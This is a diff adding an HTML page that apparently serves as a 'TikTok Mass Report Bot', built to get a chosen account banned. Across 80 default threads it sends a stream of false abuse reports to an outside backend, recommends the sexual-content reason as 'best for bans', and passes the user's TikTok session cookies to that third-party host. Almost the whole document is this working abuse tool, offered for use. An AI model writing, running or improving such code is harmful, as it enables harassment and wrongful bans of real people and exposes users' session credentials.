@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TT Ban Hammer</title>
+    <style>
+        body { background: black; color: lime; font-family: Arial; padding: 20px; text-align: center; }
+        input, select, button { width: 90%; padding: 15px; margin: 10px 0; font-size: 18px; }
+        button { background: lime; color: black; font-weight: bold; }
+        #log { height: 500px; overflow-y: scroll; background: #111; padding: 10px; margin: 10px auto; width: 90%; text-align: left; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <h1>🚀 TikTok Mass Report Bot (STRONG BACKEND)</h1>
+    <input type="text" id="url" placeholder="Paste @username or profile link">
+    <input type="text" id="cookies" placeholder="TikTok cookies (optional - stronger)">
+    <input type="number" id="threads" value="80" placeholder="Threads (80)">
+    <select id="reason">
+        <option value="6">Nudity / Sexual (Best for bans)</option>
+        <option value="4">Violence</option>
+        <option value="3">Harassment</option>
+        <option value="7">Illegal Activity</option>
+    </select>
+    <button onclick="start()">START MASS REPORT</button>
+    <button onclick="stop()">STOP</button>
+    <div id="log"></div>
+
+    <script>
+        let running = false;
+        let intervals = [];
+        const backend = "https://tt-ban-hammer.onrender.com";
+
+        function log(msg) {
+            const logEl = document.getElementById('log');
+            logEl.innerHTML += `<br>${new Date().toLocaleTimeString()} → ${msg}`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function start() {
+            if (running) return;
+            running = true;
+            const url = document.getElementById('url').value.trim();
+            const cookies = document.getElementById('cookies').value.trim();
+            const threads = parseInt(document.getElementById('threads').value) || 80;
+            const reason = document.getElementById('reason').value;
+            log('🚀 STRONG BACKEND ATTACK STARTED on ' + url);
+            for (let i = 0; i < threads; i++) {
+                const int = setInterval(() => sendReport(url, reason, cookies), 150);
+                intervals.push(int);
+            }
+        }
+
+        async function sendReport(url, reason, cookies) {
+            if (!running) return;
+            try {
+                const res = await fetch(backend + '/report', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({profileUrl: url, reason, cookies})
+                });
+                const data = await res.json();
+                if (data.success) log('✅ SUCCESSFUL REPORT SENT!');
+                else log(`❌ ${data.status || 'Blocked'}`);
+            } catch(e) {
+                log('❌ Backend connection issue');
+            }
+        }
+
+        function stop() {
+            running = false;
+            intervals.forEach(i => clearInterval(i));
+            intervals = [];
+            log('🛑 ATTACK FULLY STOPPED');
+        }
+    </script>
+</body>
+</html>
